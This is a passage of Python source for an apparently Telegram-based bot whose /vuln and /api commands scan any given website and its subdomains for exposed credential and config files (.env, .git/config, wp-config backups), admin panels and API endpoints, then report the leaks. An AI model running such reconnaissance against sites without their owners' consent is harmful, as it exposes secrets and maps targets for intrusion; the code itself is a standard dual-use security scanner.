    Get (status_code, body_hash, content_length) for baseline comparison.
    Used to detect catch-all pages.
    """
    try:
        resp = requests.get(url, headers=_get_headers(), timeout=timeout,
                            stream=True, allow_redirects=True, verify=False)
        status = resp.status_code
        chunk  = b''
        for part in resp.iter_content(1024):
            chunk += part
            if len(chunk) >= 1024: break
        resp.close()
        body_hash = hashlib.md5(chunk[:512]).hexdigest()
        ct_length = int(resp.headers.get('Content-Length', len(chunk)))
        return status, body_hash, ct_length, resp.headers.get('Content-Type','')
    except Exception:
        return 0, '', 0, ''


def _detect_catchall(base_url: str) -> tuple:
    """
    Request a random non-existent path — if it returns 200,
    the server has a catch-all (Cloudflare, custom 404 as 200).
    Returns (is_catchall: bool, baseline_hash: str, baseline_len: int)
    """
    rand_path = '/' + ''.join(random.choices(string.ascii_lowercase, k=16)) + '.html'
    status, body_hash, ct_len, ct = _get_page_fingerprint(base_url.rstrip('/') + rand_path)
    if status == 200:
        return True, body_hash, ct_len   # catch-all confirmed
    return False, '', 0


def _is_fake_200_content(body: bytes, ct: str) -> bool:
    if 'html' not in ct.lower():
        return False
    snippet = body[:800].lower()
    return any(s in snippet for s in _FAKE_SIGS)


def _probe_one(
    base_url: str, path: str, label: str, severity: str,
    catchall: bool, baseline_hash: str, baseline_len: int,
    delay: float = 0.0
) -> dict | None:
    """
    Probe one path — GET + stream.
    Compares against baseline to filter catch-all false positives.
    """
    if delay > 0:
        time.sleep(delay)

    full_url = base_url.rstrip('/') + path
    try:
        resp = requests.get(
            full_url, headers=_get_headers(),
            timeout=8, stream=True,
            allow_redirects=True, verify=False,
        )
        status = resp.status_code
        ct     = resp.headers.get('Content-Type', '')

        if status == 200:
            chunk = b''
            for part in resp.iter_content(1024):
                chunk += part
                if len(chunk) >= 1024: break
            resp.close()

            # ── Catch-all filter ──────────────────
            if catchall:
                page_hash = hashlib.md5(chunk[:512]).hexdigest()
                page_len  = int(resp.headers.get('Content-Length', len(chunk)))
                # Same hash or very similar length = catch-all page
                if page_hash == baseline_hash:
                    return None
                if baseline_len > 0 and abs(page_len - baseline_len) < 50:
                    return None

            # ── Fake 200 (custom 404 HTML) ────────
            if _is_fake_200_content(chunk, ct):
                return None

            size = int(resp.headers.get('Content-Length', len(chunk)))
            return {
                "path": path, "full_url": full_url,
                "label": label, "severity": severity,
                "status": 200, "protected": False, "size": size,
            }

        elif status == 403 and severity in ("CRITICAL","HIGH"):
            resp.close()
            # Cloudflare 403 = file might exist but CF blocks it
            cf = 'cloudflare' in resp.headers.get('Server','').lower() or \
                 'cf-ray' in resp.headers
            note = " (CF-blocked)" if cf else ""
            return {
                "path": path, "full_url": full_url,
                "label": label + note, "severity": "MEDIUM",
                "status": 403, "protected": True, "size": 0,
            }

        elif status in (301,302,307,308):
            loc = resp.headers.get('Location','')
            resp.close()
            if severity in ("HIGH","MEDIUM","LOW") and any(
                k in loc for k in ('login','auth','signin','session')
            ):
                return {
                    "path": path, "full_url": full_url,
                    "label": label + " (→ login)",
                    "severity": severity, "status": status,
                    "protected": True, "size": 0,
                }

        else:
            try: resp.close()
            except: pass

    except requests.exceptions.Timeout:
        pass
    except Exception as _e:
        logging.debug("Scan error: %s", _e)
    return None


def _verify_subdomain_real(sub_url: str) -> bool:
    """
    A subdomain is 'real' only if:
    1. DNS resolves OK
    2. HTTP responds (any code)
    3. It has DIFFERENT content than a random path on SAME subdomain
       (i.e. not a Cloudflare/nginx catch-all that mirrors base domain)
    """
    try:
        hostname = urlparse(sub_url).hostname
        socket.gethostbyname(hostname)   # DNS must resolve
    except socket.gaierror:
        return False  # NXDOMAIN = not real

    # Check if it returns anything
    try:
        r = requests.get(sub_url, headers=_get_headers(), timeout=5,
                         allow_redirects=True, verify=False, stream=True)
        r.close()
        code = r.status_code
        if code >= 500:
            return False
    except Exception:
        return False

    # Verify it's NOT a catch-all mirror of the base domain
    is_catchall, _, _ = _detect_catchall(sub_url)
    # Even catch-all subdomains can be real services — just note it
    # We still include them but mark behavior
    return True


def _scan_target_sync(
    target_url: str,
    delay_per_req: float = 0.3,
    vuln_paths: list = None,
    max_workers: int = 5,
) -> tuple:
    """Scan one URL with catch-all detection and delays."""
    if vuln_paths is None:
        vuln_paths = _VULN_PATHS
    exposed   = []
    protected = []

    # Detect catch-all first
    catchall, baseline_hash, baseline_len = _detect_catchall(target_url)

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        fmap = {
            ex.submit(
                _probe_one, target_url, path, label, sev,
                catchall, baseline_hash, baseline_len,
                delay_per_req * (i % max_workers)
            ): (path, label, sev)
            for i, (path, label, sev) in enumerate(vuln_paths)
        }
        try:
            for fut in concurrent.futures.as_completed(fmap, timeout=120):
                try:
                    f = fut.result(timeout=15)
                    if f:
                        (protected if f["protected"] else exposed).append(f)
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in fmap: f.cancel()

    exposed.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    protected.sort(key=lambda x: _SEV_ORDER.get(x["severity"],9))
    return exposed, protected, catchall


def _discover_subdomains_sync(base_url: str, progress_q: list) -> list:
    """
    Discover live subdomains — with real verification (not catch-all mirrors).
    """
    parsed = urlparse(base_url)
    scheme = parsed.scheme
    parts  = parsed.hostname.split('.')
    root   = '.'.join(parts[-2:]) if len(parts) > 2 else parsed.hostname

    progress_q.append(
        f"📡 Subdomain discovery...\n"
        f"Testing `{len(_COMMON_SUBDOMAINS)}` common names on `{root}`"
    )

    live = []

    def check_sub(sub):
        url = f"{scheme}://{sub}.{root}"
        if _verify_subdomain_real(url):
            return url
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_sub, sub): sub for sub in _COMMON_SUBDOMAINS}
        try:
            for fut in concurrent.futures.as_completed(futures, timeout=60):
                try:
                    result = fut.result(timeout=8)
                    if result:
                        live.append(result)
                except Exception:
                    pass
        except concurrent.futures.TimeoutError:
            for f in futures: f.cancel()

    return live


def _vuln_scan_sync(url: str, progress_q: list) -> dict:
    """Main orchestrator — profile-aware adaptive vuln scan."""
    results = {
        "url": url, "findings": [],
        "missing_headers": [], "clickjacking": False,
        "https": url.startswith("https://"),
        "server": "Unknown", "subdomains_found": [],
        "total_scanned": 0, "errors": 0,
        "cloudflare": False, "profile": None,
    }

    # ── Reuse or build SiteProfile ────────────────
    domain = urlparse(url).netloc
    profile = _PROFILE_CACHE.get(domain) or detect_site_profile(url)
    results["profile"] = profile.profile_name

    is_cloudflare = profile.is_cloudflare
    results["cloudflare"] = is_cloudflare

    # ── Adaptive scan settings from profile ───────
    if profile.is_cloudflare or profile.has_waf:
        req_delay   = 0.8
        sub_workers = 4
        vuln_workers = 4
    elif profile.is_shopify or profile.is_wordpress:
        req_delay   = 0.4
        sub_workers = 7
        vuln_workers = 6
    else:
        req_delay   = 0.2
        sub_workers = 10
        vuln_workers = 8

    # ── Build profile-specific extra vuln paths ───
    extra_paths = []
    if profile.is_wordpress:
        extra_paths += [
            ("/wp-config.php.bak",        "🔑 wp-config.bak",       "CRITICAL"),
            ("/wp-content/debug.log",      "📋 WP debug.log",        "HIGH"),
            ("/.git/config",               "📁 .git/config",         "CRITICAL"),
            ("/wp-json/wp/v2/users",       "👤 WP users API",        "MEDIUM"),
            ("/wp-content/uploads/",       "📁 WP uploads",          "LOW"),
            ("/xmlrpc.php",                "⚠️ xmlrpc.php",          "MEDIUM"),
        ]
    if profile.is_shopify:
        extra_paths += [
            ("/admin",                     "🔐 Shopify Admin",       "HIGH"),
            ("/products.json",             "📦 Products JSON",       "INFO"),
            ("/collections.json",          "📦 Collections JSON",    "INFO"),
            ("/pages.json",                "📄 Pages JSON",          "INFO"),
        ]
    if profile.is_spa:
        extra_paths += [
            ("/api/graphql",               "🔌 GraphQL",             "MEDIUM"),
            ("/.env",                      "🔑 .env file",           "CRITICAL"),
            ("/api/v1/users",              "👤 Users API",           "MEDIUM"),
            ("/static/js/main.chunk.js",   "📦 React main bundle",   "INFO"),
        ]

    all_vuln_paths = list(_VULN_PATHS) + extra_paths

    # ── Baseline headers ──────────────────────────
    progress_q.append(
        f"🔍 Checking security headers...\n"
        f"📋 Profile: *{profile.profile_name}* | "
        f"Workers: `{vuln_workers}` | Delay: `{req_delay}s`"
    )
    try:
        r0   = requests.get(url, timeout=10, headers=_get_headers(),
                            allow_redirects=True, verify=False)
        hdrs = dict(r0.headers)
        srv  = hdrs.get('Server', 'Unknown')
        results["server"] = srv[:60]

        for hdr,(name,sev) in _SEC_HEADERS.items():
            if hdr not in hdrs:
                results["missing_headers"].append((name, hdr, sev))
        if srv and any(c.isdigit() for c in srv):
            results["missing_headers"].append(
                ("Server version leak", f"Server: {srv[:50]}", "LOW"))
        xpb = hdrs.get('X-Powered-By', '')
        if xpb:
            results["missing_headers"].append(
                ("Tech disclosure", f"X-Powered-By: {xpb[:40]}", "LOW"))
        has_xfo = 'X-Frame-Options' in hdrs
        has_fa  = 'frame-ancestors' in hdrs.get('Content-Security-Policy', '')
        results["clickjacking"] = not has_xfo and not has_fa
    except Exception:
        results["errors"] += 1

    if is_cloudflare:
        progress_q.append(
            "☁️ *Cloudflare detected*\n"
            "Slower scan mode to avoid rate limiting..."
        )

    # ── Subdomain discovery ───────────────────────
    live_subs = _discover_subdomains_sync(url, progress_q)
    results["subdomains_found"] = live_subs

    if live_subs:
        progress_q.append(
            f"✅ *{len(live_subs)} real subdomains found:*\n"
            + "\n".join(f"  • `{urlparse(s).netloc}`" for s in live_subs[:8])
        )
    else:
        progress_q.append("📭 No live subdomains found")

    # ── Scan each target with adaptive settings ───
    all_targets = [url] + live_subs
    for i, target in enumerate(all_targets):
        netloc = urlparse(target).netloc
        progress_q.append(
            f"🔍 Scanning `{netloc}`...\n"
            f"Target `{i+1}/{len(all_targets)}` | "
            f"`{len(all_vuln_paths)}` paths"
            + (" ☁️ slow mode" if is_cloudflare else "")
        )
        exposed, protected, catchall = _scan_target_sync(
            target, req_delay, all_vuln_paths, vuln_workers
        )
        results["total_scanned"] += len(all_vuln_paths)
        if exposed or protected:
            results["findings"].append({
                "target":    target,
                "netloc":    netloc,
                "exposed":   exposed,
                "protected": protected,
                "catchall":  catchall,
            })

    return results


def _format_vuln_report(r: dict) -> str:
    domain = urlparse(r["url"]).netloc
    lines  = []

    total_exp = sum(len(f["exposed"]) for f in r["findings"])
    all_sevs  = [fi["severity"] for f in r["findings"] for fi in f["exposed"]]

    if   "CRITICAL" in all_sevs:                       overall = "🔴 CRITICAL RISK"
    elif "HIGH"     in all_sevs:                       overall = "🟠 HIGH RISK"
    elif "MEDIUM"   in all_sevs or r["clickjacking"]:  overall = "🟡 MEDIUM RISK"
    elif r["missing_headers"]:                         overall = "🔵 LOW RISK"
    else:                                              overall = "✅ CLEAN"

    cf_badge = " ☁️ Cloudflare" if r.get("cloudflare") else ""
    lines += [
        "🛡️ *Vulnerability Scan Report*",
        f"🌐 `{domain}`{cf_badge}",
        f"📊 Risk: *{overall}*",
        f"🔍 Paths: `{r['total_scanned']}` | Issues: `{total_exp}`",
        f"📡 Subdomains: `{len(r['subdomains_found'])}`",
        f"🖥️ Server: `{r['server']}`",
        "",
    ]

    # Subdomains
    if r["subdomains_found"]:
        lines.append("*📡 Live Subdomains:*")
        for s in r["subdomains_found"]:
            lines.append(f"  • {s}")
        lines.append("")

    # HTTPS
    lines.append("*🔐 HTTPS:*")
    lines.append("  ✅ HTTPS enabled" if r["https"] else "  🔴 HTTP only — no encryption!")
    lines.append("")

    # Findings per target
    if r["findings"]:
        for f in r["findings"]:
            if f["exposed"]:
                lines.append(f"*🚨 Exposed — `{f['netloc']}`:*")
                for fi in f["exposed"]:
                    em   = _SEV_EMOJI.get(fi["severity"],"⚪")
                    note = f" `[{fi['status']}]`"
                    lines.append(f"  {em} `{fi['severity']}` — {fi['label']}{note}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
            if f["protected"]:
                lines.append(f"*⚠️ Blocked (403) — `{f['netloc']}`:*")
                for fi in f["protected"][:5]:
                    em = _SEV_EMOJI.get(fi["severity"],"⚪")
                    lines.append(f"  {em} {fi['label']}")
                    lines.append(f"  🔗 {fi['full_url']}")
                lines.append("")
    else:
        lines += ["*✅ No exposed files found*", ""]

    # Clickjacking
    lines.append("*🖼️ Clickjacking:*")
    if r["clickjacking"]:
        lines.append("  🟠 Vulnerable — no X-Frame-Options / frame-ancestors")
    else:
        lines.append("  ✅ Protected")
    lines.append("")

    # Security headers
    if r["missing_headers"]:
        lines.append("*📋 Security Header Issues:*")
        for name, hdr, sev in r["missing_headers"][:8]:
            em = _SEV_EMOJI.get(sev,"⚪")
            if "leak" in name.lower() or "disclosure" in name.lower():
                lines.append(f"  {em} {name}: `{hdr}`")
            else:
                lines.append(f"  {em} Missing *{name}*")
        lines.append("")

    # Cloudflare note
    if r.get("cloudflare"):
        lines += [
            "☁️ *Cloudflare note:*",
            "  Some paths may be hidden behind CF WAF.",
            "  403 results may indicate file exists but CF blocks it.",
            "",
        ]

    lines += ["━━━━━━━━━━━━━━━━━━",
              "⚠️ _Passive scan only — no exploitation_"]
    return "\n".join(lines)


async def cmd_vuln(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/vuln <url> — Passive vuln scanner with CF-aware subdomain discovery."""
    if not context.args:
        await update.effective_message.reply_text(
            "🛡️ *Vulnerability Scanner v4*\n\n"
            "Usage: `/vuln <url>`\n\n"
            "Features:\n"
            "• 📡 Subdomain discovery (DNS verified)\n"
            "• ☁️ Cloudflare detection + slow-mode\n"
            "• 🔍 Catch-all false-positive filter\n"
            "• 🔑 Config / credential leaks\n"
            "• 📁 Git / backup / DB dumps\n"
            "• 🔐 Admin panel detection\n"
            "• 🔗 Full clickable URLs\n\n"
            "_Passive only — no exploitation_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0]
    if not url.startswith('http'):
        url = 'https://' + url

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "Vuln scan"
    allowed, wait_sec = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(
            f"⏱️ `{wait_sec}` seconds စောင့်ပါ",
            parse_mode='Markdown'); return

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(
            f"🚫 `{reason}`", parse_mode='Markdown'); return

    domain = urlparse(url).netloc
    msg = await update.effective_message.reply_text(
        f"🛡️ *Vuln Scan v4*\n🌐 `{domain}`\n\n"
        f"• Baseline & catch-all detection\n"
        f"• Subdomain discovery\n"
        f"• Path scanning\n\n_ခဏစောင့်ပါ..._",
        parse_mode='Markdown'
    )

    progress_q: list = []

    async def _prog_loop():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🛡️ *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog_loop())
    try:
        scan_task = asyncio.ensure_future(asyncio.to_thread(_vuln_scan_sync, url, progress_q))
        _scan_tasks[uid] = scan_task
        results = await scan_task
    except asyncio.CancelledError:
        prog.cancel()
        _active_scans.pop(uid, None)
        _scan_tasks.pop(uid, None)
        try: await msg.edit_text("🛑 *Vuln scan ရပ်သွားပြီ*", parse_mode='Markdown')
        except Exception: pass
        return
    except Exception as e:
        prog.cancel()
        await msg.edit_text(
            f"❌ Scan error: `{type(e).__name__}: {str(e)[:80]}`",
            parse_mode='Markdown'); return
    finally:
        _active_scans.pop(uid, None)
        _scan_tasks.pop(uid, None)
        prog.cancel()

    report = _format_vuln_report(results)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000] + "\n_...continued_", parse_mode='Markdown')
            await update.effective_message.reply_text(report[4000:], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')


# ══════════════════════════════════════════════════
# 🔌  /api — API ENDPOINT DISCOVERY COMMAND
# ══════════════════════════════════════════════════

async def cmd_api(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/api <url> — Discover API endpoints, RSS feeds, hidden paths"""
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            "သို့မဟုတ် `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "API scan"
    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/api https://example.com`\n\n"
            "🔍 *Discovery Method 4 ခု:*\n"
            "① HTML source mining _(data-attrs, inline JS)_\n"
            "② JS bundle mining _(fetch/axios/url patterns)_\n"
            "③ robots.txt / sitemap scan\n"
            f"④ `{len(ALL_API_PATHS)}` known paths brute-force\n\n"
            "🔌 *ရှာပေးသောအမျိုးအစားများ:*\n"
            "• REST API (v1/v2/v3)\n"
            "• GraphQL endpoints\n"
            "• WordPress / WooCommerce / Shopify\n"
            "• Auth (JWT, OAuth, Sanctum)\n"
            "• Admin / Dashboard APIs\n"
            "• Mobile / SaaS / Fintech APIs\n"
            "• Swagger / OpenAPI docs\n"
            "• RSS/Atom feeds\n"
            "• CORS detection\n\n"
            "📦 *Result ကို JSON file နဲ့ download ပေးမယ်*",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    # Skip rate limit if called internally from /discover
    if not context.user_data.get('_discover_internal'):
        allowed, wait = check_rate_limit(uid)
        if not allowed:
            await update.effective_message.reply_text("`%ds` စောင့်ပါ" % wait, parse_mode="Markdown")
            return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    msg    = await update.effective_message.reply_text(
        f"🔌 *API Discovery — `{domain}`*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔍 Phase 1: HTML source mining...\n"
        f"📦 Phase 2: JS bundle mining...\n"
        f"🤖 Phase 3: robots.txt scan...\n"
        f"🔌 Phase 4: `{len(ALL_API_PATHS)}` paths brute-force...\n\n"
        f"⏳ ခဏစောင့်ပါ...",
        parse_mode='Markdown'
    )

    progress_q: list = []

    async def _prog_loop():
        while True:
            await asyncio.sleep(4)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔌 *Scanning `{domain}`*\n\n{txt}",
                        parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog_loop())
    try:
        found = await asyncio.to_thread(
            discover_api_endpoints, url, lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        _active_scans.pop(uid, None)
        prog.cancel()

    result    = found   # found is now a dict
    endpoints = result.get("found", [])
    js_mined  = result.get("js_mined", [])
    html_mined= result.get("html_mined", [])
    robots    = result.get("robots", [])
    stats     = result.get("stats", {})

    # ── Summary message ───────────────────────────
    json_apis   = [e for e in endpoints if e["type"] in ("JSON_API", "GRAPHQL")]
    xml_feeds   = [e for e in endpoints if e["type"] == "XML/RSS"]
    api_docs    = [e for e in endpoints if e["type"] == "API_DOCS"]
    config_leaks= [e for e in endpoints if e["type"] == "CONFIG_LEAK"]
    source_maps = [e for e in endpoints if e["type"] == "SOURCE_MAP"]
    protected   = [e for e in endpoints if e["type"] == "PROTECTED"]
    others      = [e for e in endpoints if e["type"] == "OTHER"]
    cors_list   = [e for e in endpoints if e.get("cors")]

    all_mined = list(set(js_mined + html_mined + robots))

    if not endpoints and not all_mined:
        await msg.edit_text(
            f"🔌 *API Discovery — `{domain}`*\n\n"
            f"📭 API endpoints မတွေ့ပါ\n"
            f"_(protected or non-standard paths ဖြစ်နိုင်)_\n\n"
            f"🔍 Probed: `{stats.get('total_probed',0)}` paths",
            parse_mode='Markdown'
        )
        return

    report_lines = [
        f"🔌 *API Discovery — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📊 Endpoints: `{len(endpoints)}` | 🔍 Probed: `{stats.get('total_probed',0)}`",
        f"📦 JS mined: `{stats.get('js_urls_found',0)}` | 🌐 HTML mined: `{stats.get('html_urls_found',0)}`",
        "",
    ]

    # ── High Risk section first ───────────────────
    high_risk_eps = sorted(
        [e for e in endpoints if e.get("risk", 0) >= 30],
        key=lambda e: e.get("risk", 0), reverse=True
    )
    if high_risk_eps:
        report_lines.append(f"*🔴 High Risk Endpoints ({len(high_risk_eps)}):*")
        for e in high_risk_eps[:8]:
            path  = urlparse(e["url"]).path or e["url"]
            rsk   = e.get("risk", 0)
            ttype = e.get("type", "")
            wflag = " ⚠️WRITE" if "WRITE" in e.get("allow_methods", "") else ""
            cors  = " ✦CORS" if e.get("cors") else ""
            report_lines.append(f"  🔴 `{path}` [{ttype}] risk:`{rsk}`{wflag}{cors}")
        report_lines.append("")

    if json_apis:
        report_lines.append(f"*✅ JSON / GraphQL APIs ({len(json_apis)}):*")
        for e in json_apis[:20]:
            path = urlparse(e["url"]).path or e["url"]
            tag  = " 〔GraphQL〕" if e["type"] == "GRAPHQL" else ""
            cors = " ✦CORS" if e.get("cors") else ""
            meth = f" [{e.get('method','GET')}]" if e.get("method","GET") != "GET" else ""
            wflag = " ⚠️WRITE" if "WRITE" in e.get("allow_methods", "") else ""
            prev = e.get("preview","")[:60].replace("\n"," ")
            report_lines.append(f"  🟢 `{path}`{tag}{cors}{meth}{wflag}")
            if prev: report_lines.append(f"     _{prev}_")
        report_lines.append("")

    if xml_feeds:
        report_lines.append(f"*📰 RSS / XML Feeds ({len(xml_feeds)}):*")
        for e in xml_feeds[:10]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📡 `{path}`")
        report_lines.append("")

    if api_docs:
        report_lines.append(f"*📖 API Docs / Swagger ({len(api_docs)}):*")
        for e in api_docs[:5]:
            path = urlparse(e["url"]).path or e["url"]
            note = f" — {e['note']}" if e.get('note') else ""
            report_lines.append(f"  📘 `{path}`{note}")
        report_lines.append("")

    if config_leaks:
        report_lines.append(f"*🚨 Config / File Leaks ({len(config_leaks)}):*")
        for e in config_leaks[:8]:
            path = urlparse(e["url"]).path or e["url"]
            prev = e.get("preview","")[:50].replace("\n"," ")
            report_lines.append(f"  ⚠️ `{path}` [{e['size_b']}B]")
            if prev: report_lines.append(f"     _{prev}_")
        report_lines.append("")

    if source_maps:
        report_lines.append(f"*🗺 Source Maps Exposed ({len(source_maps)}):*")
        for e in source_maps[:5]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  🔓 `{path}` [{e['size_b']}B]")
        report_lines.append("")

    if protected:
        report_lines.append(f"*🔒 Protected — Exists ({len(protected)}):*")
        for e in protected[:10]:
            path = urlparse(e["url"]).path or e["url"]
            note = f" [{e.get('note',e['status'])}]"
            cors = " ✦CORS" if e.get("cors") else ""
            report_lines.append(f"  🔐 `{path}`{note}{cors}")
        report_lines.append("")

    if all_mined:
        unique_mined = sorted(set(
            urlparse(u).path for u in all_mined if urlparse(u).path
        ))[:20]
        report_lines.append(f"*🕵️ Mined from JS/HTML ({len(all_mined)} total):*")
        for p in unique_mined:
            report_lines.append(f"  🔎 `{p}`")
        report_lines.append("")

    if others:
        report_lines.append(f"*📄 Other ({len(others)}):*")
        for e in others[:5]:
            path = urlparse(e["url"]).path or e["url"]
            report_lines.append(f"  📋 `{path}`")
        report_lines.append("")

    if cors_list:
        report_lines.append(f"*🌍 CORS Enabled ({len(cors_list)}):*")
        for e in cors_list[:5]:
            path = urlparse(e["url"]).path
            report_lines.append(f"  🌐 `{path}` → `{e['cors']}`")
        report_lines.append("")

    report_lines.append("⚠️ _Passive scan only — no exploitation_")

    report_text = "\n".join(report_lines)

    # ── Send text report ──────────────────────────
    try:
        if len(report_text) <= 4000:
            await msg.edit_text(report_text, parse_mode='Markdown')
        else:
            await msg.edit_text(report_text[:4000], parse_mode='Markdown')
            await update.effective_message.reply_text(
                report_text[4000:8000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(
            report_text[:4000], parse_mode='Markdown')

    # ── Export full JSON report + send as file ────
    if endpoints or all_mined:
        try:
            safe_domain = re.sub(r'[^\w\-]', '_', domain)
            ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
            json_path   = os.path.join(DOWNLOAD_DIR, f"api_{safe_domain}_{ts}.json")

            export_data = {
                "domain":     domain,
                "scanned_at": datetime.now().isoformat(),
                "stats":      stats,
                "endpoints": [{
                    "url":     e["url"],
                    "type":    e["type"],
                    "status":  e["status"],
                    "cors":    e.get("cors"),
                    "preview": e.get("preview","")[:200],
                    "size_b":  e.get("size_b",0),
                } for e in endpoints],
                "js_mined":   list(set(js_mined)),
                "html_mined": list(set(html_mined)),
                "robots":     robots,
            }

            with open(json_path, 'w', encoding='utf-8') as jf:
                json.dump(export_data, jf, ensure_ascii=False, indent=2)

            cap = (
                f"📦 *API Report — `{domain}`*\n"
                f"✅ `{len(endpoints)}` endpoints | 🕵️ `{len(all_mined)}` mined\n"
                f"🗓 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            )
            with open(json_path, 'rb') as jf:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=jf,
                    filename=f"api_{safe_domain}_{ts}.json",
                    caption=cap,
                    parse_mode='Markdown'
                )
            os.remove(json_path)
        except Exception as e:
            logger.warning("API JSON export error: %s", e)





# ══════════════════════════════════════════════════
# 🔧 V30: HTML LINK REWRITER — offline browsing fix
# ══════════════════════════════════════════════════

def _url_to_rel_local(asset_url: str, page_local: str, domain_dir: str) -> str:
    """Convert an absolute/relative asset URL to a relative local path."""
    try:
        local_asset = safe_local_path(domain_dir, asset_url)
        page_dir    = os.path.dirname(page_local)
        rel         = os.path.relpath(local_asset, page_dir)
        # Windows backslash → forward slash
        return rel.replace(os.sep, '/')
    except Exception:
        return asset_url  # fallback: keep original


def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
    """
    Rewrite all href/src/srcset/url() references in HTML to
    relative local paths so the page works offline.
    Only rewrites same-origin URLs.
    """
    try:
        page_local  = safe_local_path(domain_dir, page_url)
        page_origin = f"{urlparse(page_url).scheme}://{urlparse(page_url).netloc}"
        soup        = BeautifulSoup(html, _BS_PARSER)

        # ── <link href="..."> ─────────────────────
        for tag in soup.find_all('link', href=True):
            full = urljoin(page_url, tag['href'])
            if full.startswith(page_origin):
                tag['href'] = _url_to_rel_local(full, page_local, domain_dir)

        # ── <script src="..."> ────────────────────
        for tag in soup.find_all('script', src=True):
            full = urljoin(page_url, tag['src'])
            if full.startswith(page_origin):
                tag['src'] = _url_to_rel_local(full, page_local, domain_dir)

        # ── <img src / data-src / srcset> ─────────
        LAZY = ('src','data-src','data-lazy','data-original','data-lazy-src',
                'data-full-src','data-image','data-img','data-bg',
                'data-background','data-poster','data-thumb')
        for tag in soup.find_all('img'):
            for attr in LAZY:
                v = tag.get(attr, '')
                if v and not v.startswith('data:'):
                    full = urljoin(page_url, v)
                    if full.startswith(page_origin):
                        tag[attr] = _url_to_rel_local(full, page_local, domain_dir)
            # srcset rewrite
            srcset = tag.get('srcset', '')
            if srcset:
                parts = []
                for part in srcset.split(','):
                    p = part.strip()
                    bits = p.split(' ', 1)
                    full = urljoin(page_url, bits[0])
                    if full.startswith(page_origin):
                        bits[0] = _url_to_rel_local(full, page_local, domain_dir)
                    parts.append(' '.join(bits))
                tag['srcset'] = ', '.join(parts)

        # ── <picture><source srcset="..."> WebP ───
        for tag in soup.find_all('source'):
            srcset = tag.get('srcset', '')
            if srcset:
                parts = []
                for part in srcset.split(','):
                    p = part.strip()
                    bits = p.split(' ', 1)
                    full = urljoin(page_url, bits[0])
                    if full.startswith(page_origin):
                        bits[0] = _url_to_rel_local(full, page_local, domain_dir)
                    parts.append(' '.join(bits))
                tag['srcset'] = ', '.join(parts)
            if tag.get('src'):
                full = urljoin(page_url, tag['src'])
                if full.startswith(page_origin):
                    tag['src'] = _url_to_rel_local(full, page_local, domain_dir)

        # ── <video/audio src> ─────────────────────
        for tag in soup.find_all(['video', 'audio']):
            if tag.get('src'):
                full = urljoin(page_url, tag['src'])
                if full.startswith(page_origin):
                    tag['src'] = _url_to_rel_local(full, page_local, domain_dir)
            if tag.get('poster'):
                full = urljoin(page_url, tag['poster'])
                if full.startswith(page_origin):
                    tag['poster'] = _url_to_rel_local(full, page_local, domain_dir)

        # ── <a href="..."> internal links ─────────
        for tag in soup.find_all('a', href=True):
            h = tag['href']
            if h.startswith(('#', 'mailto:', 'tel:', 'javascript:')):
                continue
            full = urljoin(page_url, h)
            if full.startswith(page_origin):
                tag['href'] = _url_to_rel_local(full, page_local, domain_dir)

        # ── <form action="..."> ───────────────────
        for tag in soup.find_all('form', action=True):
            full = urljoin(page_url, tag['action'])
            if full.startswith(page_origin):
                tag['action'] = _url_to_rel_local(full, page_local, domain_dir)

        # ── inline style url(...) ─────────────────
        for tag in soup.find_all(style=True):
            new_style = _rewrite_css_urls(tag['style'], page_url, page_local, domain_dir, page_origin)
